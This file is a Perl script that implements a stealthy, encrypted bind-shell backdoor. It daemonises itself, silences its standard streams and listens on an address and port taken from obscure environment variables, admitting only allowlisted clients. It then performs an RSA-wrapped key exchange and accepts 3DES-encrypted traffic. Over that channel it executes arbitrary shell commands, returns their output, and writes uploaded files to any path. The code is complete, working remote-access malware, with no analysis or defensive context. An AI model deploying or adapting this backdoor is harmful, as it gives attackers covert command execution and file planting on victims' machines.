#!/usr/bin/env perl

use strict;
use Socket;

$| = 1;

my $DC = "";
my $N = "f8f5f6d9b3d52b11328f0c449ab841412de18f69f879d83b0505427fda22096c9849405d0918703835ec59021d6cc52cfa4009e152d1cdc6b74a2a1770b7bcb294354ed3cc93281634655e7acbab2d8de042325a64018743a0a8fb51e362a76ecea16f658769763657b2bbfd3f6ba1d428bfc599dc959ad8758d8d747268ba69";
my $E = "10001";
my $K = "";
my $single = 0;
my $sz_chk = "x8jV";

my $CMD_COMMAND = "\x01";
my $CMD_UPLOAD  = "\x02";

main();

sub main {
    my @dc_bins = ('/usr/bin/dc', '/bin/dc', '/usr/local/bin/dc');
    my ($addr, $port, $caddr, $pid);
    my @aaddrs = ();
    my @asports = ();

    if($single == 0) {
        $pid = fork();
        if($pid != 0) {
            return;
        }
    }

    srand(time() ^ ($$ + ($$ << 15)));

    foreach my $bin (@dc_bins) {
        if(-e $bin && -X $bin) {
            $DC = $bin;
            last;
        }
    }

    if(!exists($ENV{"A"}) || !exists($ENV{"B"})) {
        exit(1);
    }

    $addr = $ENV{"A"};
    $port = $ENV{"B"};

    if(exists($ENV{"C"})) {
        @aaddrs = split(/,/, $ENV{"C"});
    }

    if(exists($ENV{"D"})) {
        @asports = split(/,/, $ENV{"D"});
    }

    socket(SSOCK, PF_INET, SOCK_STREAM, (getprotobyname('tcp'))[2])
        or die("socket\n");
    setsockopt(SSOCK, SOL_SOCKET, SO_REUSEADDR, 1);
    bind(SSOCK, pack("SnCCCCx8", AF_INET, $port, split(/\./, $addr)))
        or die("bind\n");
    listen(SSOCK, 1)
        or die("listen\n");

    if($single == 0) {
        close(STDIN);
        close(STDOUT);
        close(STDERR);
    }

    while($caddr = accept(CSOCK, SSOCK)) {
        my ($type, $cl_port, @cl_ips) = unpack("SnC4", $caddr);
        my $cl_ip = join(".", @cl_ips);

        if(scalar(@aaddrs) > 0) {
            if(scalar(grep(/$cl_ip/, @aaddrs)) == 0) {
                close(CSOCK);
                next;
            }
        }

        if(scalar(@asports) > 0) {
            if(scalar(grep(/$cl_port/, @asports)) == 0) {
                close(CSOCK);
                next;
            }
        }

        handle_client(\*CSOCK);
        close(CSOCK);
        $K = "";
    }
}

sub handle_client {
    my ($sock) = @_;
    my ($size, $data, $cmd_type, $cmd, $res);

    $K = handshake($sock);

    if($K eq "") {
        return;
    }

    while(1) {
        $size = recv_size($sock);
        if($size == -1) {
            last;
        }

        $data = recv_data($sock, $size);
        if($data eq "") {
            last;
        }

        $cmd_type = substr($data, 0, 1);
        $cmd = substr($data, 1);

        if($cmd_type eq $CMD_COMMAND) {
            $res = `$cmd 2>&1`;
            if(send_data($sock, $res) != 0) {
                last;
            }
        }
        elsif($cmd_type eq $CMD_UPLOAD) {
            if(handle_upload($cmd) == 0) {
                if(send_data($sock, "ok") != 0) {
                    last;
                }
            }
            else {
                if(send_data($sock, "no") != 0) {
                    last;
                }
            }
        }
        else {
            if(send_data($sock, "no") != 0) {
                last;
            }
        }

        $cmd = undef;
        undef $cmd;
        $res = undef;
        undef $res;
    }
}

sub handshake {
    my ($fh) = @_;
    my ($key, $pad, $enc);

    $key = rand_bytes(24);
    $pad = rand_bytes(103);
    $enc = rsa($N, $E, 1, "$key$pad");

    if($enc eq "") {
        return "";
    }

    if(sendall($fh, $enc) <= 0) {
        return "";
    }
    
    return $key;
}

sub handle_upload {
    my ($data) = @_;
    my ($null_idx, $path, $file);
    
    $null_idx = index($data, "\x00");
    $path = substr($data, 0, $null_idx);
    $file = substr($data, $null_idx + 1);

    open(my $fh, ">$path")
        or return -1;
    print $fh $file;
    close($fh);

    return 0;
}

sub send_data {
    my ($fh, $data) = @_;
    my ($iv1, $iv2, $len, $len_str, $buf);

    $iv1 = rand_bytes(8);
    $iv2 = rand_bytes(8);
    $len_str = pack("N", length($data)) . $sz_chk;

    $buf = $iv1;
    $buf .= des3_cbc($K, $len_str, 1, $iv1);
    $buf .= $iv2;
    $buf .= des3_cbc($K, $data, 1, $iv2);

    if(sendall($fh, $buf) <= 0) {
        return -1;
    }

    return 0;
}

sub recv_data {
    my ($fh, $plain_len) = @_;
    my ($data, $iv, $plain, $len);

    $len = $plain_len + ((8 - ($plain_len % 8)) % 8);
    $data = recvall($fh, 8 + $len);

    if($data eq "") {
        return "";
    }

    $iv = substr($data, 0, 8);
    $plain = des3_cbc($K, substr($data, 8, $len), 0, $iv);

    return substr($plain, 0, $plain_len);
}

sub recv_size {
    my ($fh) = @_;
    my ($data, $iv, $hdr, $size);

    $data = recvall($fh, 16);

    if(length($data) != 16) {
        return -1;
    }

    $iv = substr($data, 0, 8);
    $hdr = des3_cbc($K, substr($data, 8, 8), 0, $iv);
    $size = unpack("N", substr($hdr, 0, 4));
    
    if(substr($hdr, 4, 4) ne $sz_chk) {
        return -1;
    }
    return $size;
}

sub sendall {
    my ($fh, $msg) = @_;
    my ($len, $num_sent, $ret);

    $len = length($msg);
    $num_sent = 0;

    while($num_sent < $len) {
        $ret = syswrite($fh, $msg, $len - $num_sent, $num_sent);
        if(!defined($ret) || $ret == 0) {
            return -1;
        }

        $num_sent += $ret;
    }

    return $num_sent;
}

sub recvall {
    my ($fh, $len) = @_;
    my ($buf, $data, $tot, $nrecv);
    my ($nfound, $rin, $tmout);

    $data = "";
    $tot = 0;

    $tmout = 30;
    $rin = "";
    vec($rin, fileno($fh), 1) = 1;

    while($tot < $len) {
        $nfound = select($rin, undef, undef, $tmout);
        if($nfound == 0) {
            return "";
        }

        $nrecv = sysread($fh, $buf, $len - $tot);
        if($nrecv == 0) {
            return "";
        }

        $data .= $buf;
        $tot += $nrecv;
    }

    return $data;
}

sub rand_bytes {
    my ($num) = @_;
    my $r = "";
    
    while($num-- > 0) {
        $r .= chr(int(rand(256)));
    }

    return $r;
}

sub rsa {
    my ($n, $k, $encrypt, $msg) = @_;
    my ($w, $v, $u, $a, $m, $c);
    
    $k = "0$k" if(length($k) & 1);
    $n = "0$n" if(length($n) & 1);
    $w = length($n);
    $v = $w;

    if($encrypt) {
        $w -= 2;
    }
    else {
        $v -= 2;
    }
    
    if(length($msg) != ($w / 2)) {
        return "";
    }

    $u = unpack("B*", pack("H*", $k));
    $u =~ s/^0*//g;
    $u =~ s/0/d*ln%/g;
    $u =~ s/1/d*ln%lm*ln%/g;
    $c = "1${u}p";

    $m = unpack("H$w", $msg);
    $a = `echo 16o16i\U$m\Esm\U$n\Esn$c|$DC`;
    chomp($a);
    $a =~ s/\\\n//g;

    return pack("H*", "0"x($v - length($a)).$a);
}

sub des3_cbc {
    my($key, $message, $encrypt, $iv) = @_;

    my @spf1 = (0x1010400,0,0x10000,0x1010404,0x1010004,0x10404,0x4,0x10000,
                0x400,0x1010400,0x1010404,0x400,0x1000404,0x1010004,0x1000000,0x4,
                0x404,0x1000400,0x1000400,0x10400,0x10400,0x1010000,0x1010000,0x1000404,
                0x10004,0x1000004,0x1000004,0x10004,0,0x404,0x10404,0x1000000,
                0x10000,0x1010404,0x4,0x1010000,0x1010400,0x1000000,0x1000000,0x400,
                0x1010004,0x10000,0x10400,0x1000004,0x400,0x4,0x1000404,0x10404,
                0x1010404,0x10004,0x1010000,0x1000404,0x1000004,0x404,0x10404,0x1010400,
                0x404,0x1000400,0x1000400,0,0x10004,0x10400,0,0x1010004);
    my @spf2 = (0x80108020,0x80008000,0x8000,0x108020,0x100000,0x20,0x80100020,0x80008020,
                0x80000020,0x80108020,0x80108000,0x80000000,0x80008000,0x100000,0x20,0x80100020,
                0x108000,0x100020,0x80008020,0,0x80000000,0x8000,0x108020,0x80100000,
                0x100020,0x80000020,0,0x108000,0x8020,0x80108000,0x80100000,0x8020,
                0,0x108020,0x80100020,0x100000,0x80008020,0x80100000,0x80108000,0x8000,
                0x80100000,0x80008000,0x20,0x80108020,0x108020,0x20,0x8000,0x80000000,
                0x8020,0x80108000,0x100000,0x80000020,0x100020,0x80008020,0x80000020,0x100020,
                0x108000,0,0x80008000,0x8020,0x80000000,0x80100020,0x80108020,0x108000);
    my @spf3 = (0x208,0x8020200,0,0x8020008,0x8000200,0,0x20208,0x8000200,
                0x20008,0x8000008,0x8000008,0x20000,0x8020208,0x20008,0x8020000,0x208,
                0x8000000,0x8,0x8020200,0x200,0x20200,0x8020000,0x8020008,0x20208,
                0x8000208,0x20200,0x20000,0x8000208,0x8,0x8020208,0x200,0x8000000,
                0x8020200,0x8000000,0x20008,0x208,0x20000,0x8020200,0x8000200,0,
                0x200,0x20008,0x8020208,0x8000200,0x8000008,0x200,0,0x8020008,
                0x8000208,0x20000,0x8000000,0x8020208,0x8,0x20208,0x20200,0x8000008,
                0x8020000,0x8000208,0x208,0x8020000,0x20208,0x8,0x8020008,0x20200);
    my @spf4 = (0x802001,0x2081,0x2081,0x80,0x802080,0x800081,0x800001,0x2001,
                0,0x802000,0x802000,0x802081,0x81,0,0x800080,0x800001,
                0x1,0x2000,0x800000,0x802001,0x80,0x800000,0x2001,0x2080,
                0x800081,0x1,0x2080,0x800080,0x2000,0x802080,0x802081,0x81,
                0x800080,0x800001,0x802000,0x802081,0x81,0,0,0x802000,
                0x2080,0x800080,0x800081,0x1,0x802001,0x2081,0x2081,0x80,
                0x802081,0x81,0x1,0x2000,0x800001,0x2001,0x802080,0x800081,
                0x2001,0x2080,0x800000,0x802001,0x80,0x800000,0x2000,0x802080);
    my @spf5 = (0x100,0x2080100,0x2080000,0x42000100,0x80000,0x100,0x40000000,0x2080000,
                0x40080100,0x80000,0x2000100,0x40080100,0x42000100,0x42080000,0x80100,0x40000000,
                0x2000000,0x40080000,0x40080000,0,0x40000100,0x42080100,0x42080100,0x2000100,
                0x42080000,0x40000100,0,0x42000000,0x2080100,0x2000000,0x42000000,0x80100,
                0x80000,0x42000100,0x100,0x2000000,0x40000000,0x2080000,0x42000100,0x40080100,
                0x2000100,0x40000000,0x42080000,0x2080100,0x40080100,0x100,0x2000000,0x42080000,
                0x42080100,0x80100,0x42000000,0x42080100,0x2080000,0,0x40080000,0x42000000,
                0x80100,0x2000100,0x40000100,0x80000,0,0x40080000,0x2080100,0x40000100);
    my @spf6 = (0x20000010,0x20400000,0x4000,0x20404010,0x20400000,0x10,0x20404010,0x400000,
                0x20004000,0x404010,0x400000,0x20000010,0x400010,0x20004000,0x20000000,0x4010,
                0,0x400010,0x20004010,0x4000,0x404000,0x20004010,0x10,0x20400010,
                0x20400010,0,0x404010,0x20404000,0x4010,0x404000,0x20404000,0x20000000,
                0x20004000,0x10,0x20400010,0x404000,0x20404010,0x400000,0x4010,0x20000010,
                0x400000,0x20004000,0x20000000,0x4010,0x20000010,0x20404010,0x404000,0x20400000,
                0x404010,0x20404000,0,0x20400010,0x10,0x4000,0x20400000,0x404010,
                0x4000,0x400010,0x20004010,0,0x20404000,0x20000000,0x400010,0x20004010);
    my @spf7 = (0x200000,0x4200002,0x4000802,0,0x800,0x4000802,0x200802,0x4200800,
                0x4200802,0x200000,0,0x4000002,0x2,0x4000000,0x4200002,0x802,
                0x4000800,0x200802,0x200002,0x4000800,0x4000002,0x4200000,0x4200800,0x200002,
                0x4200000,0x800,0x802,0x4200802,0x200800,0x2,0x4000000,0x200800,
                0x4000000,0x200800,0x200000,0x4000802,0x4000802,0x4200002,0x4200002,0x2,
                0x200002,0x4000000,0x4000800,0x200000,0x4200800,0x802,0x200802,0x4200800,
                0x802,0x4000002,0x4200802,0x4200000,0x200800,0,0x2,0x4200802,
                0,0x200802,0x4200000,0x800,0x4000002,0x4000800,0x800,0x200002);
    my @spf8 = (0x10001040,0x1000,0x40000,0x10041040,0x10000000,0x10001040,0x40,0x10000000,
                0x40040,0x10040000,0x10041040,0x41000,0x10041000,0x41040,0x1000,0x40,
                0x10040000,0x10000040,0x10001000,0x1040,0x41000,0x40040,0x10040040,0x10041000,
                0x1040,0,0,0x10040040,0x10000040,0x10001000,0x41040,0x40000,
                0x41040,0x40000,0x10041000,0x1000,0x40,0x10040040,0x1000,0x41040,
                0x10001000,0x40,0x10000040,0x10040000,0x10040040,0x10000000,0x40000,0x10001040,
                0,0x10041040,0x40040,0x10000040,0x10040000,0x10001000,0x10001040,0,
                0x10041040,0x41000,0x41000,0x1040,0x1040,0x40040,0x10000000,0x10041000);

    my ($m, $i, $j, $temp, $temp2, $right1, $right2, $left, $right, @looping) = (0);
    my ($cbcleft, $cbcleft2, $cbcright, $cbcright2);
    my ($endloop, $loopinc, $result, $tempresult);
    my $chunk = 0;

    if(length($key) != 24) {
        return 0;
    }

    my @keys = des3_create_keys($key);

    my $iterations = 9;
    my $n = $#keys;
    @looping = $encrypt ? (0, 32, 2, 62, 30, -2, 64, 96, 2) : (94, 62, -2, 32, 64, 2, 30, -2, -2);

    my $pad_len = (8 - (length($message) % 8)) % 8;
    $message .= "\0" x $pad_len;
    my $len = length($message);

    $result = "";
    $tempresult = "";

    $cbcleft = ((unpack("C", substr($iv, $m++, 1)) << 24) | 
                (unpack("C", substr($iv, $m++, 1)) << 16) | 
                (unpack("C", substr($iv, $m++, 1)) << 8) | 
                unpack("C", substr($iv, $m++, 1))) & 0xffffffff;
    $cbcright = ((unpack("C", substr($iv, $m++, 1)) << 24) | 
                 (unpack("C", substr($iv, $m++, 1)) << 16) | 
                 (unpack("C", substr($iv, $m++, 1)) << 8) | 
                 unpack("C", substr($iv, $m++, 1))) & 0xffffffff;
    $m = 0;

    while ($m < $len) {
        $left = ((unpack("C", substr($message, $m++, 1)) << 24) | 
                 (unpack("C", substr($message, $m++, 1)) << 16) | 
                 (unpack("C", substr($message, $m++, 1)) << 8) | 
                 unpack("C", substr($message, $m++, 1))) & 0xffffffff;
        $right = ((unpack("C", substr($message, $m++, 1)) << 24) | 
                  (unpack("C", substr($message, $m++, 1)) << 16) | 
                  (unpack("C", substr($message, $m++, 1)) << 8) | 
                  unpack("C", substr($message, $m++, 1))) & 0xffffffff;

        if ($encrypt) {
            $left ^= $cbcleft;
            $right ^= $cbcright
        } 
        else {
            $cbcleft2 = $cbcleft; 
            $cbcright2 = $cbcright; 
            $cbcleft = $left; 
            $cbcright = $right;
        }

        $temp = (($left >> 4) ^ $right) & 0x0f0f0f0f;
        $right ^= $temp;
        $left ^= ($temp << 4) & 0xffffffff;
        
        $temp = (($left >> 16) ^ $right) & 0x0000ffff;
        $right ^= $temp;
        $left ^= ($temp << 16) & 0xffffffff;
        
        $temp = (($right >> 2) ^ $left) & 0x33333333;
        $left ^= $temp;
        $right ^= ($temp << 2) & 0xffffffff;
        
        $temp = (($right >> 8) ^ $left) & 0x00ff00ff;
        $left ^= $temp;
        $right ^= ($temp << 8) & 0xffffffff;
        
        $temp = (($left >> 1) ^ $right) & 0x55555555;
        $right ^= $temp;
        $left ^= ($temp << 1) & 0xffffffff;

        $left = (($left << 1) | ($left >> 31)) & 0xffffffff;
        $right = (($right << 1) | ($right >> 31)) & 0xffffffff; 

        for ($j = 0; $j < $iterations; $j += 3) {
            $endloop = $looping[$j + 1]; 
            $loopinc = $looping[$j + 2]; 

            for ($i = $looping[$j]; $i != $endloop; $i += $loopinc) {
                $right1 = $right ^ $keys[$i];
                $right2 = ((($right >> 4) | ($right << 28)) ^ $keys[$i+1]) & 0xffffffff;

                $temp = $left;
                $left = $right;
                $right = $temp ^ ($spf2[($right1 >> 24) & 0x3f] |
                                  $spf4[($right1 >> 16) & 0x3f] |
                                  $spf6[($right1 >>  8) & 0x3f] |
                                  $spf8[$right1 & 0x3f] |
                                  $spf1[($right2 >> 24) & 0x3f] |
                                  $spf3[($right2 >> 16) & 0x3f] |
                                  $spf5[($right2 >>  8) & 0x3f] |
                                  $spf7[$right2 & 0x3f]);
            }

            $temp = $left; 
            $left = $right; 
            $right = $temp;
        }

        $left = (($left >> 1) | ($left << 31)) & 0xffffffff; 
        $right = (($right >> 1) | ($right << 31)) & 0xffffffff; 

        $temp = (($left >> 1) ^ $right) & 0x55555555;
        $right ^= $temp;
        $left ^= ($temp << 1) & 0xffffffff;
        
        $temp = (($right >> 8) ^ $left) & 0x00ff00ff;
        $left ^= $temp;
        $right ^= ($temp << 8) & 0xffffffff;
        
        $temp = (($right >> 2) ^ $left) & 0x33333333;
        $left ^= $temp;
        $right ^= ($temp << 2) & 0xffffffff;
        
        $temp = (($left >> 16) ^ $right) & 0x0000ffff;
        $right ^= $temp;
        $left ^= ($temp << 16) & 0xffffffff;
        
        $temp = (($left >> 4) ^ $right) & 0x0f0f0f0f;
        $right ^= $temp;
        $left ^= ($temp << 4) & 0xffffffff;

        if ($encrypt) {
            $cbcleft = $left; 
            $cbcright = $right;
        } 
        else {
            $left ^= $cbcleft2; 
            $right ^= $cbcright2;
        }

        $tempresult .= pack("C*", (($left >> 24), (($left >> 16) & 0xff),
                                   (($left >> 8) & 0xff), ($left & 0xff),
                                   ($right >> 24), (($right >> 16) & 0xff),
                                   (($right >> 8) & 0xff), ($right & 0xff)));

        $chunk += 8;
        if ($chunk == 512) {
            $result .= $tempresult;
            $tempresult = "";
            $chunk = 0;
        }
    }

    return $result . $tempresult;
}

sub des3_create_keys {
    use integer;
    my($key) = @_;

    my @pc2b0 = (0,0x4,0x20000000,0x20000004,0x10000,0x10004,0x20010000,0x20010004,
                 0x200,0x204,0x20000200,0x20000204,0x10200,0x10204,0x20010200,0x20010204);
    my @pc2b1 = (0,0x1,0x100000,0x100001,0x4000000,0x4000001,0x4100000,0x4100001,
                 0x100,0x101,0x100100,0x100101,0x4000100,0x4000101,0x4100100,0x4100101);
    my @pc2b2 = (0,0x8,0x800,0x808,0x1000000,0x1000008,0x1000800,0x1000808,
                 0,0x8,0x800,0x808,0x1000000,0x1000008,0x1000800,0x1000808);
    my @pc2b3 = (0,0x200000,0x8000000,0x8200000,0x2000,0x202000,0x8002000,0x8202000,
                 0x20000,0x220000,0x8020000,0x8220000,0x22000,0x222000,0x8022000,0x8222000);
    my @pc2b4 = (0,0x40000,0x10,0x40010,0,0x40000,0x10,0x40010,
                 0x1000,0x41000,0x1010,0x41010,0x1000,0x41000,0x1010,0x41010);
    my @pc2b5 = (0,0x400,0x20,0x420,0,0x400,0x20,0x420,
                 0x2000000,0x2000400,0x2000020,0x2000420,0x2000000,0x2000400,0x2000020,0x2000420);
    my @pc2b6 = (0,0x10000000,0x80000,0x10080000,0x2,0x10000002,0x80002,0x10080002,
                 0,0x10000000,0x80000,0x10080000,0x2,0x10000002,0x80002,0x10080002);
    my @pc2b7 = (0,0x10000,0x800,0x10800,0x20000000,0x20010000,0x20000800,0x20010800,
                 0x20000,0x30000,0x20800,0x30800,0x20020000,0x20030000,0x20020800,0x20030800);
    my @pc2b8 = (0,0x40000,0,0x40000,0x2,0x40002,0x2,0x40002,
                 0x2000000,0x2040000,0x2000000,0x2040000,0x2000002,0x2040002,0x2000002,0x2040002);
    my @pc2b9 = (0,0x10000000,0x8,0x10000008,0,0x10000000,0x8,0x10000008,
                 0x400,0x10000400,0x408,0x10000408,0x400,0x10000400,0x408,0x10000408);
    my @pc2b10 = (0,0x20,0,0x20,0x100000,0x100020,0x100000,0x100020,
                  0x2000,0x2020,0x2000,0x2020,0x102000,0x102020,0x102000,0x102020);
    my @pc2b11 = (0,0x1000000,0x200,0x1000200,0x200000,0x1200000,0x200200,0x1200200,
                  0x4000000,0x5000000,0x4000200,0x5000200,0x4200000,0x5200000,0x4200200,0x5200200);
    my @pc2b12 = (0,0x1000,0x8000000,0x8001000,0x80000,0x81000,0x8080000,0x8081000,
                  0x10,0x1010,0x8000010,0x8001010,0x80010,0x81010,0x8080010,0x8081010);
    my @pc2b13 = (0,0x4,0x100,0x104,0,0x4,0x100,0x104,
                  0x1,0x5,0x101,0x105,0x1,0x5,0x101,0x105);

    my $iterations = 3;

    my @keys; 
    $#keys = (32 * $iterations);

    my @shifts = (0, 0, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0);

    my ($m, $n, $lefttemp, $righttemp, $left, $right, $temp) = (0, 0);

    for (my $j = 0; $j < $iterations; $j++) {
        $left = ((unpack("C", substr($key, $m++, 1)) << 24) | 
                 (unpack("C", substr($key, $m++, 1)) << 16) | 
                 (unpack("C", substr($key, $m++, 1)) << 8) | 
                 unpack("C", substr($key, $m++, 1))) & 0xffffffff;
        $right = ((unpack("C", substr($key, $m++, 1)) << 24) | 
                  (unpack("C", substr($key, $m++, 1)) << 16) | 
                  (unpack("C", substr($key, $m++, 1)) << 8) | 
                  unpack("C", substr($key, $m++, 1))) & 0xffffffff;

        $temp = (($left >> 4) ^  $right) & 0x0f0f0f0f;
        $right ^= $temp;
        $left  ^= ($temp << 4) & 0xffffffff;

        $temp = (($right >>  16)^ $left) & 0x0000ffff;
        $left ^=  $temp;
        $right ^= ($temp <<  16) & 0xffffffff;

        $temp = (($left >> 2) ^  $right) & 0x33333333;
        $right ^= $temp;
        $left  ^= ($temp << 2) & 0xffffffff;

        $temp = (($right >>  16)^ $left) & 0x0000ffff;
        $left ^=  $temp;
        $right ^= ($temp <<  16) & 0xffffffff;

        $temp = (($left >> 1) ^  $right) & 0x55555555;
        $right ^= $temp;
        $left  ^= ($temp << 1) & 0xffffffff;

        $temp = (($right >> 8) ^  $left) & 0x00ff00ff;
        $left ^=  $temp;
        $right ^= ($temp << 8) & 0xffffffff;

        $temp = (($left >> 1) ^  $right) & 0x55555555;
        $right ^= $temp;
        $left  ^= ($temp << 1) & 0xffffffff;

        $temp = (($left << 8) | (($right >> 20) & 0x000000f0)) & 0xffffffff;
        $left = (($right << 24) | (($right << 8) & 0xff0000) | 
                 (($right >> 8) & 0xff00) | (($right >> 24) & 0xf0)) & 0xffffffff;
        $right = $temp;

        for (my $i = 0; $i <= $#shifts; $i++) {
            if ($shifts[$i]) {
                no integer;
                $left = (($left << 2) | ($left >> 26)) & 0xffffffff;
                $right = (($right << 2) | ($right >> 26)) & 0xffffffff;
                use integer;
                $left <<= 0;
                $right <<= 0;
            } else {
                no integer;
                $left = (($left << 1) | ($left >> 27)) & 0xffffffff; 
                $right = (($right << 1) | ($right >> 27)) & 0xffffffff;
                use integer;
                $left <<= 0;
                $right <<= 0;
            }
            
            $left &= 0xfffffff0; 
            $right &= 0xfffffff0;

            $lefttemp = $pc2b0[$left >> 28] | $pc2b1[($left >> 24) & 0xf]
                | $pc2b2[($left >> 20) & 0xf] | $pc2b3[($left >> 16) & 0xf]
                | $pc2b4[($left >> 12) & 0xf] | $pc2b5[($left >> 8) & 0xf]
                | $pc2b6[($left >> 4) & 0xf];
            $righttemp = $pc2b7[$right >> 28] | $pc2b8[($right >> 24) & 0xf]
                | $pc2b9[($right >> 20) & 0xf] | $pc2b10[($right >> 16) & 0xf]
                | $pc2b11[($right >> 12) & 0xf] | $pc2b12[($right >> 8) & 0xf]
                | $pc2b13[($right >> 4) & 0xf];
            $temp = (($righttemp >> 16) ^ $lefttemp) & 0x0000ffff;
            $keys[$n++] = ($lefttemp ^ $temp) & 0xffffffff;
            $keys[$n++] = ($righttemp ^ ($temp << 16)) & 0xffffffff;
        }
    }

    return @keys;
}
